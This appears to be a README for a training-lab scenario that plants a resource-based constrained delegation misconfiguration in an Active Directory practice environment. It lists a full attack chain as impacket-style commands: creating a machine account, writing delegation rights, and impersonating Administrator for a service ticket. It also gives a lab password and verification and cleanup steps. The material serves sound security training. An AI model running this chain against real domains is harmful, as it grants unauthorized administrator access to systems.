# rbcd

Creates `scn-rbcd-attacker` (password `Aa1234567890!`) with `GenericWrite` on the target member server's computer account.

Depends on `maq` enabled on the DC of the target's domain (to create a computer account), e.g. `enable_scenario maq dc02` before `enable_scenario rbcd srv02` on GOAD-Base.

Attack:

    addcomputer.py -computer-name 'scnrbcd$' -computer-pass 'Aa1234567890!' <domain>/scn-rbcd-attacker:'Aa1234567890!' -dc-ip <dc ip>
    rbcd.py -delegate-from 'scnrbcd$' -delegate-to '<host>$' -action write <domain>/scn-rbcd-attacker:'Aa1234567890!' -dc-ip <dc ip>
    getST.py -spn 'cifs/<host fqdn>' -impersonate Administrator <domain>/'scnrbcd$':'Aa1234567890!' -dc-ip <dc ip>

How to verify:

    dacledit.py -action read -principal scn-rbcd-attacker -target '<host>$' <domain>/scn-rbcd-attacker:'Aa1234567890!' -dc-ip <dc ip>

Disable removes the ACE, clears `msDS-AllowedToActOnBehalfOfOtherIdentity` and `msDS-KeyCredentialLink` on the target computer (both empty in Base), deletes the computer accounts the attacker created, and deletes the user.
